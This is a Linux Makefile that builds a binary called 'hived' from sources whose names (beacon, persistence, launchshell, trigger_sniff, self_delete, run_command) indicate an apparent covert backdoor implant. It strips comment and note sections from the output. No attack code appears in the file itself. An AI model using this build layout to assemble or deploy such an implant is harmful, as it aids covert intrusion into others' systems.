#------------------------------------------------
#Makefile for compiling Linux
# Makefile.linux-x86
#
# For other possible targets, please enter:
#	
#		make all
#
#------------------------------------------------


BIN = .
LIB = .

CLIENT_BASENAME = hive
SERVER_BASENAME = hived

POLARSSL = polarssl
BZIP2 = bzip/bzip2-1.0.6
INCLUDES = -I$(POLARSSL)/include -I$(BZIP2) -I../libs
LIBPOLARSSL = $(POLARSSL)/library/libpolarssl.a
LIBBZIP2 = $(BZIP2)/libbz2.a

LDFLAGS = -lpthread -lutil

SERVER_SRCS = beacon.c persistence.c launchshell.c \
	shuffle.c twofish.c farm9crypt.c jshell.c \
	survey_mac.c survey_uptime.c trigger_listen.c daemonize.c \
	main.c init_strings.o string_utils.o tiny_crc16.c \
	self_delete.c trigger_b64.c trigger_payload.c trigger_sniff.c \
	threads.c trigger_callback_session.c client_session.c run_command.c $(POLARSSL)/crypto.c $(LIBPOLARSSL) \
	get_data.c process_list.c netstat_an.c netstat_rn.c ifconfig.c compression.c $(LIBBZIP2)

PS = process_list.c
NETSTAT = netstat_an.c netstat_rn.c
IFC = ifconfig.c

CFLAGS = -Wall -Wextra -ansi -std=gnu99
CFLAGS += -D_X86 -D_FILE_OFFSET_BITS=64 -m64 -lpthread -lutil
CFLAGS += $(INCLUDES)
CFLAGS += -DLINUX

DBGFLAGS += -DDEBUG -D_DEBUG -g

STRIPFLAGS += --strip-all --remove-section=.comment --remove-section=.note

OS = $(shell uname)

ifeq ($(OS),Linux)
ARCH = $(shell uname -m)
SERVER = $(SERVER_BASENAME)-linux-$(ARCH)
endif

.PHONY: all
all: $(SERVER) $(SERVER)-dbg

polarssl: $(LIBPOLARSSL)

$(LIBPOLARSSL): strings
	cd $(POLARSSL)/library && $(MAKE) TARGET=linux-x86_64
#	cd $(POLARSSL) && $(MAKE)

bzip:	$(LIBBZIP2)

bzip2:	$(LIBBZIP2)

$(LIBBZIP2):
	cd $(BZIP2) && $(MAKE) -f Makefile.linux-x86_64 libbz2.a

.PHONY: debug
debug: $(SERVER)-dbg

.PHONY: release
release: $(SERVER)

$(SERVER): strings $(LIBPOLARSSL) $(LIBBZIP2)
ifeq ($(OS),Linux)
	gcc $(CFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) $(LDFLAGS)  -o $(BIN)/$(SERVER)
	strip $(STRIPFLAGS) $(BIN)/$(SERVER)
	md5sum $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
endif

$(SERVER)-dbg: strings $(LIBPOLARSSL) $(LIBBZIP2)
ifeq ($(OS),Linux)
	gcc $(CFLAGS) $(DBGFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) $(LDFLAGS) -o $(BIN)/$(SERVER)-dbg
	md5sum $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
endif


valgrind: strings $(LIBPOLARSSL) $(LIBBZIP2)
ifeq ($(OS),Linux)
	gcc -D__VALGRIND__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BIN)/$(SERVER)-$@
endif

.PHONY: efence
efence: strings $(LIBPOLARSSL) $(LIBBZIP2)
ifeq ($(OS),Linux)
	gcc -lefence -D__EFENCE__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BIN)/$(SERVER)-$@
endif

.PHONY: strings
strings: init_strings.o string_utils.o

init_strings.o: init_strings.c string_utils.o
	gcc -c init_strings.c

init_strings.c: server_strings.txt string_utils.h
	python mod_gen_string_header.py server_strings.txt SERVER_STRINGS

string_utils.o: string_utils.h string_utils.c
	gcc -c string_utils.c 

.PHONY: clean
clean:
	make -f ./Makefile clean

.PHONY: svnclean
svnclean: clean

.PHONY: md5
md5: all
	md5sum $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
	md5sum $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5

.PHONY: tarball	
tarball:
	make -f ./Makefile tarball
